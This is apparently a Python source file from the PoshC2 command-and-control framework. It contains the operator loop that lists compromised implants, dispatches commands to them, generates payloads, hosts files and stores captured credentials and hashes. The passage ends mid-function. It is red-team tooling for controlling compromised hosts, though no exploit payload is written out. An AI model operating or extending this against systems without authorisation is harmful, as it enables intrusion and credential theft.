import sys
import os
import subprocess
import traceback
import signal
import argparse
import re

from datetime import datetime, timedelta, date, timezone

from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style

from poshc2.client.Help import SERVER_COMMANDS, PY_COMMANDS, SHARP_COMMANDS, POSH_COMMANDS, JXA_COMMANDS, LINUX_COMMANDS, server_help
from poshc2.Colours import Colours
from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, ReportsDirectory, ModulesDirectory, Database, DatabaseType
from poshc2.server.Config import PBindPipeName, PBindSecret, PayloadCommsHost, DomainFrontHeader, FCommFileName, UserAgent
from poshc2.server.Core import get_creds_from_params, print_good, print_bad, number_of_days
from poshc2.client.reporting.HTML import generate_html_table, graphviz
from poshc2.client.reporting.CSV import generate_csv
from poshc2.server.payloads.Payloads import Payloads
from poshc2.Utils import validate_sleep_time, randomuri, parse_creds, validate_killdate, string_to_array, get_first_url, no_yes_prompt, yes_no_prompt, validate_timestamp_string
from poshc2.client.command_handlers.JxaHandler import handle_jxa_command
from poshc2.client.command_handlers.LinuxHandler import handle_linux_command
from poshc2.client.command_handlers.PyHandler import handle_py_command
from poshc2.client.command_handlers.SharpHandler import handle_sharp_command
from poshc2.client.command_handlers.PSHandler import handle_ps_command
from poshc2.client.command_handlers.PbindHandler import handle_pbind_command
from poshc2.client.command_handlers.PbindPivotHandler import handle_pbind_pivot_command
from poshc2.client.command_handlers.FCommHandler import handle_fcomm_command
from poshc2.client.cli.CommandPromptCompleter import FirstWordFuzzyWordCompleter
from poshc2.client.Help import banner
from poshc2.server.database.DBType import DBType
from poshc2.server.database.DB import update_item, get_c2server_all, get_implants_all, get_tasks, get_implantdetails, new_urldetails, database_connect
from poshc2.server.database.DB import get_newimplanturl, get_implantbyid, get_implants, new_c2_message, update_label, new_task, hide_implant, unhide_implant
from poshc2.server.database.DB import get_c2urls, del_autorun, del_autoruns, add_autorun, get_autorun, get_newtasks_all
from poshc2.server.database.DB import drop_newtasks, get_implanttype, get_randomuri, get_creds, get_creds_for_user, insert_cred
from poshc2.server.database.DB import get_hosted_files, insert_hosted_file, del_hosted_file, enable_hosted_file, select_item, del_newtasks
from poshc2.server.database.DB import insert_opsec_event, del_opsec_event, get_opsec_events, get_powerstatusbyrandomuri

utcTimezone = timezone(timedelta(hours=0))


def catch_exit(signum, frame):
    sys.exit(0)


def get_implant_type_prompt_prefix(implant_id):
    if "," in str(implant_id):
        return ""
    implant = get_implantbyid(implant_id)
    pivot = implant.Pivot
    pivot_original = pivot
    if pivot_original.startswith("PS"):
        pivot = "PS"
    elif pivot_original.startswith("C#"):
        pivot = "C#"
    elif pivot_original.startswith("Python"):
        pivot = "PY"
    elif pivot_original.startswith("JXA"):
        pivot = "JXA"
    elif pivot_original.startswith("NativeLinux"):
        pivot = "NL"
    if "Daisy" in pivot_original:
        pivot = pivot + ";D"
    if "Proxy" in pivot_original:
        pivot = pivot + ";P"
    if "PBind" in pivot_original:
        pivot = pivot + ";PB"
    if "FComm" in pivot_original:
        pivot = pivot + ";FC"
    return pivot


def implant_handler_command_loop(user, printhelp="", autohide=None):
    while(True):
        session = PromptSession(history=FileHistory('%s/.top-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory())

        try:
            if user is not None:
                print("User: " + Colours.BLUE + "%s%s" % (user, Colours.GREEN))
                print()

            C2 = get_c2server_all()
            killdate = datetime.strptime(C2.KillDate, '%Y-%m-%d').date()
            datedifference = number_of_days(date.today(), killdate)
            if datedifference < 8:
                print(Colours.RED + ("\nKill Date is - %s - expires in %s days" % (C2.KillDate, datedifference)))
                print(Colours.END)
                print()

            implants = get_implants()
            if implants:
                for implant in implants:
                    ID = implant.ImplantID
                    LastSeen = implant.LastSeen
                    Hostname = implant.Hostname
                    Domain = implant.Domain
                    URLID = implant.URLID
                    DomainUser = implant.User
                    Arch = implant.Arch
                    PID = implant.PID
                    ProcName = implant.ProcName
                    Sleep = implant.Sleep.strip()
                    Label = implant.Label

                    apmsuspendshut = False

                    pwrStatus = get_powerstatusbyrandomuri(implant.RandomURI)
                    if pwrStatus is not None:
                        if Label is not None:
                            Label += " "
                        else:
                            Label = ""
                        apmstatus = pwrStatus[2].lower()

                        if (apmstatus == "shutdown"):
                            Label += "SHTDWN "
                            apmsuspendshut = True
                        elif (apmstatus == "suspend" or apmstatus == "querysuspend"):
                            Label += "SUSPND "
                            apmsuspendshut = True

                        if not apmsuspendshut:
                            if (pwrStatus[7]):
                                Label += "LOCKED "
                            if (not pwrStatus[8]):
                                Label += "SCRN OFF "

                            if (not pwrStatus[3]):
                                if (pwrStatus[6] is not None and pwrStatus[6].isdigit()):
                                    Label += ("DSCHRG: %s%% " % pwrStatus[6])
                                else:
                                    Label += ("DSCHRG ")

                    Pivot = get_implant_type_prompt_prefix(ID)
                    LastSeenTime = datetime.strptime(LastSeen, "%Y-%m-%d %H:%M:%S")
                    LastSeenTime = LastSeenTime.replace(tzinfo=utcTimezone)
                    now = datetime.now(timezone.utc)
                    sleep_int = sleepint(Sleep)
                    if sleep_int == "error":
                        print(Colours.RED)
                        print("Incorrect sleep format: %s" % Sleep)
                        print(Colours.GREEN)
                        continue
                    nowMinus3Beacons = now - timedelta(seconds=(sleep_int * 3))
                    nowMinus10Beacons = now - timedelta(seconds=(sleep_int * 10))
                    nowMinus30Beacons = now - timedelta(seconds=(sleep_int * 30))
                    sID = "[" + str(ID) + "]"
                    if not Label:
                        sLabel = ""
                    else:
                        Label = Label.strip()
                        sLabel = Colours.BLUE + "[" + Label + "]" + Colours.GREEN

                    if "C#;PB" in Pivot:
                        print(Colours.BLUE + "%s: %s | %s (%s) | %s | PBind | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
                    elif "C#;FC" in Pivot:
                        print(Colours.PURPLE + "%s: %s | %s (%s) | %s | FComm | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
                    elif nowMinus30Beacons > LastSeenTime and autohide:
                        pass
                    elif nowMinus10Beacons > LastSeenTime:
                        print(Colours.RED + "%s: %s | %s (%s) | %s | %s | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, URLID, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
                    elif nowMinus3Beacons > LastSeenTime:
                        print(Colours.YELLOW + "%s: %s | %s (%s) | %s | %s | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, URLID, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
                    else:
                        print(Colours.GREEN + "%s: %s | %s (%s) | %s | %s | %s\\%s @ %s (%s) %s %s" % (sID.ljust(4), LastSeenTime, ProcName, PID.ljust(5), Sleep, URLID, Domain, DomainUser, Hostname, Arch, Pivot, sLabel))
            else:
                now = datetime.now(timezone.utc)
                print(Colours.RED + "No Implants as of: %s" % now.strftime("%Y-%m-%d %H:%M:%S"))

            if printhelp:
                print(printhelp)

            command = session.prompt("\nSelect ImplantID or ALL or Comma Separated List (Enter to refresh):: ", completer=FirstWordFuzzyWordCompleter(SERVER_COMMANDS, WORD=True))
            print("")

            command = command.strip()
            if (command == "") or (command == "back") or (command == "clear"):
                do_back(user, command)
                continue
            if command.startswith("generate-reports"):
                do_generate_reports(user, command)
                continue
            if command.startswith("generate-csvs"):
                do_generate_csvs(user, command)
                continue
            if command.startswith("message "):
                do_message(user, command)
                continue
            if command.startswith("show-hosted-files"):
                do_show_hosted_files(user, command)
                continue
            if command.startswith("add-hosted-file"):
                do_add_hosted_file(user, command)
                continue
            if command.startswith("disable-hosted-file"):
                do_disable_hosted_file(user, command)
                continue
            if command.startswith("enable-hosted-file"):
                do_enable_hosted_file(user, command)
                continue
            if command.startswith("show-urls") or command.startswith("list-urls"):
                do_show_urls(user, command)
                continue
            if command.startswith("add-autorun"):
                do_add_autorun(user, command)
                continue
            if command.startswith("list-autorun"):
                do_list_autoruns(user, command)
                continue
            if command.startswith("del-autorun"):
                do_del_autorun(user, command)
                continue
            if command.startswith("nuke-autorun"):
                do_nuke_autoruns(user, command)
                continue
            if command.startswith("kill"):
                do_del_task(user, command)
                continue
            if command.startswith("show-serverinfo"):
                do_show_serverinfo(user, command)
                continue
            if command.startswith("turnoff-notifications"):
                do_turnoff_notifications(user, command)
                continue
            if command.startswith("turnon-notifications"):
                do_turnon_notifications(user, command)
                continue
            if command.startswith("set-pushover-applicationtoken"):
                do_set_pushover_applicationtoken(user, command)
                continue
            if command.startswith("set-pushover-userkeys"):
                do_set_pushover_userkeys(user, command)
                continue
            if command.startswith("set-slack-userid"):
                do_set_slack_userid(user, command)
                continue
            if command.startswith("set-slack-channel"):
                do_set_slack_channel(user, command)
                continue
            if command.startswith("set-slack-bottoken"):
                do_set_slack_bottoken(user, command)
                continue
            if command.startswith("get-killdate"):
                do_get_killdate(user, command)
                continue
            if command.startswith("set-killdate"):
                do_set_killdate(user, command)
                continue
            if command.startswith("set-defaultbeacon"):
                do_set_defaultbeacon(user, command)
                continue
            if command == "get-opsec-events":
                do_get_opsec_events(user, command)
                continue
            if command == "add-opsec-event":
                do_insert_opsec_events(user, command)
                continue
            if command == "del-opsec-event":
                do_del_opsec_events(user, command)
                continue
            if command.startswith("opsec"):
                do_opsec(user, command)
                continue
            if command.startswith("listmodules"):
                do_listmodules(user, command)
                continue
            if command.startswith('creds ') or command.strip() == "creds":
                do_creds(user, command)
                input("Press Enter to continue...")
                clear()
                continue
            if (command == "pwnself") or (command == "p"):
                do_pwnself(user, command)
                continue
            if command == "tasks":
                do_tasks(user, command)
                continue
            if command == "cleartasks":
                do_cleartasks(user, command)
                continue
            if command.startswith("quit"):
                do_quit(user, command)
                continue
            if command.startswith("createdaisypayload"):
                do_createdaisypayload(user, command)
                continue
            if command.startswith("createproxypayload"):
                do_createnewpayload(user, command)
                continue
            if command.startswith("createnewpayload"):
                do_createnewpayload(user, command)
                continue
            if command.startswith("createnewshellcode"):
                do_createnewpayload(user, command, shellcodeOnly=True)
                continue
            if command.startswith("createnewcustompayload"):
                do_createnewpayload(user, command, custom=True)
                continue
            if command.startswith("createpbindpayload"):
                do_createnewpayload(user, command, pbindOnly=True)
                continue
            if command.startswith("createlinuxpayload"):
                do_createnewpayload(user, command, linuxOnly=True)
                continue
            if command == "help":
                do_help(user, command)
                continue
            if command == "history":
                do_history(user, command)
                continue
            if command.startswith("hide-dead-implants"):
                do_hide_dead_implants(user, command)
                continue
            if command.startswith("use "):
                do_use(user, command)
            implant_command_loop(command, user)
        except KeyboardInterrupt:
            clear()
            continue
        except EOFError:
            new_c2_message("%s logged off." % user)
            sys.exit(0)
        except Exception as e:
            if 'unable to open database file' not in str(e):
                print_bad("Error: %s" % e)
                traceback.print_exc()


def run_implant_command(command, randomuri, implant_id, user):

    # Common Implant Commands
    if command.startswith("creds ") or command.strip() == "creds":
        do_creds(user, command)
        return
    elif command.startswith('label-implant'):
        do_label_implant(user, command, randomuri)
        return
    elif command.startswith('remove-label'):
        do_remove_label(user, command, randomuri)
        return
    if command.startswith("beacon"):
        do_beacon(user, command, randomuri)
        return
    elif command == "quit":
        do_quit(user, command)
        return
    elif command.startswith("unhide-implant"):
        do_unhide_implant(user, command, randomuri)
        return
    elif command.startswith("hide-implant"):
        do_hide_implant(user, command, randomuri)
        return
    elif command == "back" or command == "clear":
        do_back(user, command)
        return
    elif command.startswith("searchhistory"):
        do_searchhistory(user, command, randomuri)
        return

    implant_type = get_implanttype(randomuri)
    if implant_type.startswith("Python"):
        handle_py_command(command, user, randomuri, implant_id)
        return
    elif implant_type.startswith("C# PBind Pivot"):
        handle_pbind_pivot_command(command, user, randomuri, implant_id)
        return
    elif implant_type.startswith("C# PBind"):
        handle_pbind_command(command, user, randomuri, implant_id)
        return
    elif implant_type.startswith("C# FComm"):
        handle_fcomm_command(command, user, randomuri, implant_id)
        return
    elif implant_type.startswith("C#"):
        handle_sharp_command(command, user, randomuri, implant_id)
        return
    elif implant_type.startswith("JXA"):
        handle_jxa_command(command, user, randomuri, implant_id)
        return
    elif implant_type.startswith("NativeLinux"):
        handle_linux_command(command, user, randomuri, implant_id)
        return
    else:
        handle_ps_command(command, user, randomuri, implant_id)
        return


def implant_command_loop(implant_id, user):
    while(True):
        try:
            style = Style.from_dict({
                '': '#80d130',
            })
            session = PromptSession(history=FileHistory('%s/.implant-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
            implant_id_orig = implant_id
            if ("-" in implant_id) or ("all" in implant_id) or ("," in implant_id):
                print(Colours.GREEN)
                prompt_commands = SHARP_COMMANDS
                command = session.prompt("%s> " % implant_id, completer=FirstWordFuzzyWordCompleter(prompt_commands, WORD=True))
                if command == "back" or command == 'clear':
                    do_back(user, command)
                    return
            else:
                implant = get_implantbyid(implant_id)
                if not implant:
                    print_bad("Unrecognised implant id or command: %s" % implant_id)
                    input("Press Enter to continue...")
                    clear()
                    return
                prompt_commands = POSH_COMMANDS
                if implant.Pivot.startswith('Python'):
                    prompt_commands = PY_COMMANDS
                if implant.Pivot.startswith('JXA'):
                    prompt_commands = JXA_COMMANDS
                if implant.Pivot.startswith('NativeLinux'):
                    prompt_commands = LINUX_COMMANDS
                if implant.Pivot.startswith('C#'):
                    prompt_commands = SHARP_COMMANDS
                if 'PB' in implant.Pivot:
                    style = Style.from_dict({
                        '': '#008ECC',
                    })
                    session = PromptSession(history=FileHistory('%s/.implant-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
                    prompt_commands = SHARP_COMMANDS
                    print(Colours.BLUE)
                if 'FC' in implant.Pivot:
                    style = Style.from_dict({
                        '': '#772953',
                    })
                    session = PromptSession(history=FileHistory('%s/.implant-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
                    prompt_commands = SHARP_COMMANDS
                    print(Colours.PURPLE)
                else:
                    print(Colours.GREEN)
                print("%s\\%s @ %s (PID:%s - Process:%s)" % (implant.Domain, implant.User, implant.Hostname, implant.PID, implant.ProcName))
                command = session.prompt("%s %s> " % (get_implant_type_prompt_prefix(implant_id), implant_id), completer=FirstWordFuzzyWordCompleter(prompt_commands, WORD=True))
                if command == "back" or command == 'clear':
                    do_back(user, command)
                    return

            # if "all" run through all implants get_implants()
            if implant_id == "all":
                if command == "back" or command == 'clear':
                    do_back(user, command)
                    return
                allcommands = command
                if "\n" in command:
                    ri = input("Do you want to run commands separately? (Y/n) ")
                implants_split = get_implants()
                if implants_split:
                    for implant_details in implants_split:
                        # if "\n" in command run each command individually or ask the question if that's what they want to do
                        if "\n" in allcommands:
                            if ri.lower() == "y" or ri == "":
                                commands = allcommands.split('\n')
                                for command in commands:
                                    run_implant_command(command, implant_details.RandomURI, implant_id_orig, user)
                            else:
                                run_implant_command(command, implant_details.RandomURI, implant_id_orig, user)
                        else:
                            run_implant_command(command, implant_details.RandomURI, implant_id_orig, user)

            # if "separated list" against single uri
            elif "," in implant_id:
                allcommands = command
                if "\n" in command:
                    ri = input("Do you want to run commands separately? (Y/n) ")
                implant_split = implant_id.split(",")
                for split_implant_id in implant_split:
                    implant_randomuri = get_randomuri(split_implant_id)
                    # if "\n" in command run each command individually or ask the question if that's what they want to do
                    if "\n" in allcommands:
                        if ri.lower() == "y" or ri == "":
                            commands = allcommands.split('\n')
                            for command in commands:
                                run_implant_command(command, implant_randomuri, implant_id_orig, user)
                        else:
                            run_implant_command(command, implant_randomuri, implant_id_orig, user)
                    else:
                        run_implant_command(command, implant_randomuri, implant_id_orig, user)

            # if "range" against single uri
            elif "-" in implant_id:
                allcommands = command
                if "\n" in command:
                    ri = input("Do you want to run commands separately? (Y/n) ")
                implant_split = implant_id.split("-")
                for range_implant_id in range(int(implant_split[0]), int(implant_split[1]) + 1):
                    try:
                        implant_randomuri = get_randomuri(range_implant_id)
                        # if "\n" in command run each command individually or ask the question if that's what they want to do
                        if "\n" in allcommands:
                            if ri.lower() == "y" or ri == "":
                                commands = allcommands.split('\n')
                                for command in commands:
                                    run_implant_command(command, implant_randomuri, implant_id_orig, user)
                            else:
                                run_implant_command(command, implant_randomuri, implant_id_orig, user)
                        else:
                            run_implant_command(command, implant_randomuri, implant_id_orig, user)
                    except Exception:
                        print_bad("Unknown ImplantID")

            # else run against single uri
            else:
                allcommands = command
                if "\n" in command:
                    ri = input("Do you want to run commands separately? (Y/n) ")
                implant_randomuri = get_randomuri(implant_id)
                # if "\n" in command run each command individually or ask the question if that's what they want to do
                if "\n" in allcommands:
                    if ri.lower() == "y" or ri == "":
                        commands = allcommands.split('\n')
                        for command in commands:
                            run_implant_command(command, implant_randomuri, implant_id_orig, user)
                    else:
                        run_implant_command(command, implant_randomuri, implant_id_orig, user)
                else:
                    run_implant_command(command, implant_randomuri, implant_id_orig, user)

        except KeyboardInterrupt:
            continue
        except EOFError:
            new_c2_message("%s logged off." % user)
            sys.exit(0)
        except Exception as e:
            traceback.print_exc()
            print_bad(f"Error running against the selected implant ID, ensure you have typed the correct information: {e}")
            return


def do_searchhistory(user, command, randomuri):
    searchterm = (command).replace("searchhistory ", "")
    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
        for line in hisfile:
            if searchterm in line.lower():
                print(Colours.GREEN + line.replace("+", ""))


def do_back(user, command):
    clear()
    pass


def do_clear(user, command):
    return do_back(user, command)


def do_generate_reports(user, command):
    try:
        generate_html_table("Tasks")
        generate_html_table("C2Server")
        generate_html_table("Creds")
        generate_html_table("Implants")
        generate_html_table("URLs")
        generate_html_table("OpSec_Entry")
        graphviz()
        generate_csv("Tasks")
        generate_csv("C2Server")
        generate_csv("Creds")
        generate_csv("Implants")
        generate_csv("OpSec_Entry")
        generate_opsec(user, command)
    except PermissionError as e:
        print_bad(str(e))
    input("Press Enter to continue...")
    clear()


def do_generate_csvs(user, command):
    try:
        generate_csv("Tasks")
        generate_csv("C2Server")
        generate_csv("Creds")
        generate_csv("Implants")
        generate_csv("OpSec_Entry")
    except PermissionError as e:
        print_bad(str(e))
    input("Press Enter to continue...")
    clear()


def do_message(user, command):
    message = command[len("message "):]
    new_c2_message("Message from %s - %s" % (user, message))
    clear()


def do_show_urls(user, command):
    urls = get_c2urls()
    urlformatted = "ID  Name  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
    for i in urls:
        urlformatted += "%s  %s  %s  %s  %s  %s  %s  %s \n" % (i[0], i[1], i[2], i[3], i[4], i[5], i[6], i[7])
    print_good(urlformatted)
    input("Press Enter to continue...")
    clear()


def get_opsec_events_string(user, command):
    events = get_opsec_events()
    if events:
        eventsformatted = "ID  Date  Owner  Event  Note \n"
        for i in events:
            eventsformatted += "%s  %s  %s  %s  %s \n" % (i[0], i[1], i[2], i[3], i[4])
        return eventsformatted


def do_get_opsec_events(user, command):
    events_string = get_opsec_events_string(user, command)
    if (events_string):
        print_good("\nOpSec Events:")
        print_good(events_string)
    input("Press Enter to continue...")
    clear()


def do_del_opsec_events(user, command):
    delopsec_id = command.lower().replace("del-opsec-event", "").strip()
    if not delopsec_id:
        delopsec_id = input("Enter Opsec ID: ")
    del_opsec_event(delopsec_id)
    print_good("Opsec Event has been removed\r\n")
    input("Press Enter to continue...")
    clear()


def do_insert_opsec_events(user, command):
    opsec_timestamp_format = "%Y-%m-%d %H:%M"
    timestamp_string = datetime.now(timezone.utc).strftime(opsec_timestamp_format)
    timestamp = input(f"Timestamp: (Press Enter for {timestamp_string}) ").strip()
    if not timestamp:
        timestamp = timestamp_string
    if not validate_timestamp_string(timestamp, opsec_timestamp_format):
        print_bad("Please enter a valid timestamp in format yyyy-mm-dd HH:MM")
        input("Press Enter to continue...")
        clear()
        return
    event = input("Event: ")
    note = input("Notes: ")
    insert_opsec_event(timestamp, user, event, note)
    print_good("Event added successfully")
    do_get_opsec_events(user, command)


def do_show_hosted_files(user, command):
    hosted_files = get_hosted_files()
    filesformatted = "ID  URI  FilePath  ContentType  Base64  Active\n"
    for hosted_file in hosted_files:
        filesformatted += f"{hosted_file.ID}  {hosted_file.URI}  {hosted_file.FilePath}  {hosted_file.ContentType}  {hosted_file.Base64}  {hosted_file.Active} \n"
    print_good(filesformatted)
    input("Press Enter to continue...")
    clear()


def do_add_hosted_file(user, command):
    FilePath = input("File Path (e.g. /tmp/application.docx): ")
    URI = input("URI Path (e.g. /downloads/2020/application): ")
    ContentType = input("Content Type (e.g. text/html): ")
    if ContentType == "":
        ContentType = "text/html"
    Base64 = no_yes_prompt("Base64 Encode File")
    if not Base64:
        Base64 = "No"
    else:
        Base64 = "Yes"
    if not URI or not FilePath:
        print_bad("Please enter a FilePath and URI")
        input("Press Enter to continue...")
        clear()
        return
    insert_hosted_file(URI, FilePath, ContentType, Base64, "Yes")
    FirstURL = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
    print_good("Added hosted-file \n\n%s%s -> %s (%s)\r\n" % (FirstURL, URI, FilePath, ContentType))
    do_show_hosted_files(user, command)
    clear()


def do_disable_hosted_file(user, command):
    hosted_file_id = command.lower().replace("disable-hosted-file ", "")
    hosted_file_id = command.lower().replace("disable-hosted-file", "").strip()
    if hosted_file_id == "":
        hosted_file_id = input("Enter hosted-file ID: ")
    del_hosted_file(hosted_file_id)
    print_good("Disabled hosted-file\r\n")
    input("Press Enter to continue...")
    clear()


def do_enable_hosted_file(user, command):
    hosted_file_id = command.lower().replace("enable-hosted-file ", "")
    hosted_file_id = command.lower().replace("enable-hosted-file", "").strip()
    if hosted_file_id == "":
        hosted_file_id = input("Enter hosted-file ID: ")
    enable_hosted_file(hosted_file_id)
    print_good("Enabled hosted-file\r\n")
    input("Press Enter to continue...")
    clear()


def do_add_autorun(user, command):
    if command == "add-autorun":
        print_bad("Please specify a module to autorun")
        return
    autorun = command.replace("add-autorun ", "")
    autorun = autorun.replace("add-autorun", "")
    add_autorun(autorun)
    print_good("add-autorun: %s\r\n" % autorun)
    input("Press Enter to continue...")
    clear()


def do_list_autoruns(user, command):
    print_good(get_autorun())
    input("Press Enter to continue...")
    clear()


def do_del_autorun(user, command):
    autorun = command.replace("del-autorun ", "")
    del_autorun(autorun)
    print_good("deleted autorun\r\n")
    input("Press Enter to continue...")
    clear()


def do_nuke_autoruns(user, command):
    del_autoruns()
    print_good("nuked autoruns\r\n")
    input("Press Enter to continue...")
    clear()


def do_show_serverinfo(user, command):
    C2 = get_c2server_all()
    detailsformatted = "\nPayloadCommsHost: %s\nEncKey: %s\nDomainFrontHeader: %s\nDefaultSleep: %s\nKillDate: %s\nGET_404_Response: %s\nPoshProjectDirectory: %s\nQuickCommand: %s\nDownloadURI: %s\nDefaultProxyURL: %s\nDefaultProxyUser: %s\nDefaultProxyPass: %s\nURLS: %s\nSocksURLS: %s\nInsecure: %s\nUserAgent: %s\nReferer: %s\nPushover_APIToken: %s\nPushover_APIUser: %s\nSlack_UserID: %s\nSlack_Channel: %s\nSlack_BotToken: %s\nEnableNotifications: %s\n" % (C2.PayloadCommsHost, C2.EncKey, C2.DomainFrontHeader, C2.DefaultSleep, C2.KillDate, C2.GET_404_Response, C2.PoshProjectDirectory, C2.QuickCommand, C2.DownloadURI, C2.ProxyURL, C2.ProxyUser, C2.ProxyPass, C2.URLS, C2.SocksURLS, C2.Insecure, C2.UserAgent, C2.Referrer, C2.Pushover_APIToken, C2.Pushover_APIUser, C2.Slack_UserID, C2.Slack_Channel, C2.Slack_BotToken, C2.EnableNotifications)
    print_good(detailsformatted)
    input("Press Enter to continue...")
    clear()


def do_turnoff_notifications(user, command):
    update_item("EnableNotifications", "C2Server", "No")
    print_good("Turned off notifications on new implant")
    input("Press Enter to continue...")
    clear()


def do_turnon_notifications(user, command):
    update_item("EnableNotifications", "C2Server", "Yes")
    print_good("Turned on notifications on new implant")
    input("Press Enter to continue...")
    clear()


def do_set_pushover_applicationtoken(user, command):
    cmd = command.replace("set-pushover-applicationtoken ", "")
    cmd = cmd.replace("set-pushover-applicationtoken", "")
    update_item("Pushover_APIToken", "C2Server", cmd)
    print_good("Updated Pushover API Token: %s\r\n" % cmd)
    input("Press Enter to continue...")
    clear()


def do_set_pushover_userkeys(user, command):
    cmd = command.replace("set-pushover-userkeys ", "")
    cmd = cmd.replace("set-pushover-userkeys", "")
    update_item("Pushover_APIUser", "C2Server", cmd)
    print_good("Updated Pushover User Token: (Restart C2 Server): %s\r\n" % cmd)
    input("Press Enter to continue...")
    clear()

def do_set_slack_userid(user, command):
    cmd = command.replace("set-slack-userid ", "")
    cmd = cmd.replace("set-slack-userid", "")
    update_item("Slack_UserID", "C2Server", cmd)
    print_good("Updated Slack User ID: %s\r\n" % cmd)
    input("Press Enter to continue...")
    clear()


def do_set_slack_channel(user, command):
    cmd = command.replace("set-slack-channel ", "")
    cmd = cmd.replace("set-slack-channel", "")
    update_item("Slack_Channel", "C2Server", cmd)
    print_good("Updated Slack Channel: %s\r\n" % cmd)
    input("Press Enter to continue...")
    clear()

def do_set_slack_bottoken(user, command):
    cmd = command.replace("set-slack-bottoken ", "")
    cmd = cmd.replace("set-slack-bottoken", "")
    update_item("Slack_BotToken", "C2Server", cmd)
    print_good("Updated Slack Bot Token: %s\r\n" % cmd)
    input("Press Enter to continue...")
    clear()


def do_get_killdate(user, command):
    killdate = select_item("KillDate", "C2Server")
    print_good(f"KillDate: {killdate}")
    input("Press Enter to continue...")
    clear()


def do_set_killdate(user, command):
    new_killdate = command.replace("set-killdate ", "")
    new_killdate = new_killdate.replace("set-killdate", "").strip()
    if not validate_killdate(new_killdate):
        print_bad("Invalid killdate format, please specify a killdate in format yyyy-MM-dd")
    else:
        update_item("KillDate", "C2Server", new_killdate)
        print_good("Updated KillDate (Remember to generate new payloads and get new implants): %s\r\n" % new_killdate)
    input("Press Enter to continue...")
    clear()


def do_set_defaultbeacon(user, command):
    new_sleep = command.replace("set-defaultbeacon ", "")
    new_sleep = new_sleep.replace("set-defaultbeacon", "")
    if not validate_sleep_time(new_sleep):
        print_bad("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
    else:
        update_item("DefaultSleep", "C2Server", new_sleep)
        print_good("Updated set-defaultbeacon (Restart C2 Server): %s\r\n" % new_sleep)
    input("Press Enter to continue...")
    clear()


def get_opsec_string(user, command):
    implants = get_implants_all()
    comtasks = get_tasks()
    urls = get_c2urls()
    users = ""
    hosts = ""
    uploads = ""
    creds = ""
    hashes = ""
    urlformatted = "ID  Name  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
    for i in (urls or []):
        urlformatted += "%s  %s  %s  %s  %s  %s  %s  %s \n" % (i[0], i[1], i[2], i[3], i[4], i[5], i[6], i[7])
    for implant in (implants or []):
        if implant.Hostname not in hosts:
            hosts += "%s \n" % implant.Hostname
    for task in (comtasks or []):
        implant = get_implantdetails(task[1])
        command = task[2].lower()
        output = task[3].lower()
        if implant.User not in users:
            users += "%s\\%s @ %s\n" % (implant.Domain, implant.User, implant.Hostname)
        if "invoke-pbind" in command and "connected" in output:
            tg = re.search("(?<=-target )\\S*", str(command))
            if tg[0] not in hosts:
                hosts += "%s \n" % tg[0]
        if "uploading file" in command:
            uploadedfile = command
            uploadedfile = uploadedfile.partition("uploading file: ")[2].strip()
            filehash = uploadedfile.partition(" with md5sum:")[2].strip()
            uploadedfile = uploadedfile.partition(" with md5sum:")[0].strip()
            uploadedfile = uploadedfile.strip('"')
            uploads += "%s @ %s\t%s\t%s\n" % (implant.User,implant.Hostname, filehash, uploadedfile)
        if "installing persistence" in output:
            line = command.replace('\n', '')
            line = line.replace('\r', '')
            filenameuploaded = line.rstrip().split(":", 1)[1]
            uploads += "%s %s \n" % (implant.User, filenameuploaded)
        if "written scf file" in output:
            uploads += "%s %s \n" % (implant.User, output)
        creds, hashes = parse_creds(get_creds())
    return (f"\nUsers Compromised: \n{users}\nHosts Compromised: \n{hosts}\nURLs: \n{urlformatted}\nFiles Uploaded: \n{uploads}\nCredentials Compromised: \n{creds}\nHashes Compromised: \n{hashes}")


def do_opsec(user, command):
    print_good(get_opsec_string(user, command))
    do_get_opsec_events(user, command)


def generate_opsec(user, command):
    reportname = f"{ReportsDirectory}opsec.txt"
    output_file = open(reportname, 'w')
    output_file.write(get_opsec_string(user, command))
    events_string = get_opsec_events_string(user, command)
    if (events_string):
        output_file.write("\nOpSec Events:")
        output_file.write(events_string)
    output_file.close()


def do_listmodules(user, command):
    mods = ""
    for modname in os.listdir(ModulesDirectory):
        mods += "%s\r\n" % modname
    print(mods)
    input("Press Enter to continue...")
    clear()


def do_creds(user, command):
    if "-add " in command:
        p = re.compile(r"-domain=([^\s]*)")
        domain = re.search(p, command)
        if domain:
            domain = domain.group(1)
        p = re.compile(r"-username=([^\s]*)")
        username = re.search(p, command)
        if username:
            username = username.group(1)
        p = re.compile(r"-password=([^\s]*)")
        password = re.search(p, command)
        if password:
            password = password.group(1)
        else:
            p = re.compile(r"-password=([^\s]*)")
            password = re.search(p, command)
            if password:
                password = password.group(1)
        p = re.compile(r"-hash=([^\s]*)")
        hash = re.search(p, command)
        if hash:
            hash = hash.group(1)
        if not domain or not username:
            print_bad("Please specify a domain and username")
            return
        if password and hash:
            print_bad("Please specify a password or a hash, but not both")
            return
        if not password and not hash:
            print_bad("Please specify either a password or a hash")
            return
        insert_cred(domain, username, password, hash)
        print_good("Credential added successfully")
        return
    elif "-search " in command:
        username = command.replace("creds ", "")
        username = username.replace("-search ", "")
